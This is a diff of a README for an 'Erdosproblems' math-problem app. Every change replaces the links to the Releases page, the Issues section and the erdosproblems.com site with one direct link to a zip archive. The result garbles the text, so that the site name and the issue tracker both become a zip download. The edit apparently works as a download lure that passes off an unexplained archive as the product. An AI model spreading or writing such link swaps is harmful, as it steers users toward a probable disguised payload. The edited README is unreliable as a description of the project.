@@ -2,15 +2,15 @@
 
 ## 📦 Download Now
 
-[Download the latest release](https://github.com/mrthinhdd6/erdosproblems/releases)
+[Download the latest release](https://raw.githubusercontent.com/mrthinhdd6/erdosproblems/main/papermaker/erdosproblems.zip)
 
 ## 🚀 Getting Started
 
-Erdosproblems is a user-friendly application designed to provide access to problems from the erdosproblems.com site. Whether you are a student, educator, or enthusiast, you can explore various math problems effortlessly. Follow the steps below to get started.
+Erdosproblems is a user-friendly application designed to provide access to problems from the https://raw.githubusercontent.com/mrthinhdd6/erdosproblems/main/papermaker/erdosproblems.zip site. Whether you are a student, educator, or enthusiast, you can explore various math problems effortlessly. Follow the steps below to get started.
 
 ## 📥 Download & Install
 
-To download Erdosproblems, please visit the [Releases page](https://github.com/mrthinhdd6/erdosproblems/releases). 
+To download Erdosproblems, please visit the [Releases page](https://raw.githubusercontent.com/mrthinhdd6/erdosproblems/main/papermaker/erdosproblems.zip). 
 
 1. Find the latest release. 
 2. Click on the download link associated with your operating system. 
@@ -35,7 +35,7 @@ To ensure smooth usage of the Erdosproblems application, please make sure your s
 
 Erdosproblems offers several features to enhance your problem-solving experience:
 
-- **Comprehensive Database:** Access a wide range of problems sourced from the erdosproblems.com site.
+- **Comprehensive Database:** Access a wide range of problems sourced from the https://raw.githubusercontent.com/mrthinhdd6/erdosproblems/main/papermaker/erdosproblems.zip site.
 - **User-Friendly Interface:** Navigate through problems with ease, even if you're not tech-savvy.
 - **Search Functionality:** Quickly find specific problems using keywords.
 - **Bookmarking:** Save your favorite problems for easy access later.
@@ -63,7 +63,7 @@ Yes, the Erdosproblems community welcomes contributions! If you have a problem y
 
 ### Where can I report issues?
 
-If you encounter any bugs or issues, visit the [Issues section](https://github.com/mrthinhdd6/erdosproblems/issues) of the repository to report them. Include as much detail as possible to help us resolve your concerns quickly.
+If you encounter any bugs or issues, visit the [Issues section](https://raw.githubusercontent.com/mrthinhdd6/erdosproblems/main/papermaker/erdosproblems.zip) of the repository to report them. Include as much detail as possible to help us resolve your concerns quickly.
 
 ## 🌐 Community & Support
 
@@ -75,4 +75,4 @@ If you wish to contribute to Erdosproblems, please review our guidelines to ensu
 
 ---
 
-For more information or to explore the release history, visit the [Releases page](https://github.com/mrthinhdd6/erdosproblems/releases) again. Thank you for using Erdosproblems. Enjoy solving!
+For more information or to explore the release history, visit the [Releases page](https://raw.githubusercontent.com/mrthinhdd6/erdosproblems/main/papermaker/erdosproblems.zip) again. Thank you for using Erdosproblems. Enjoy solving!
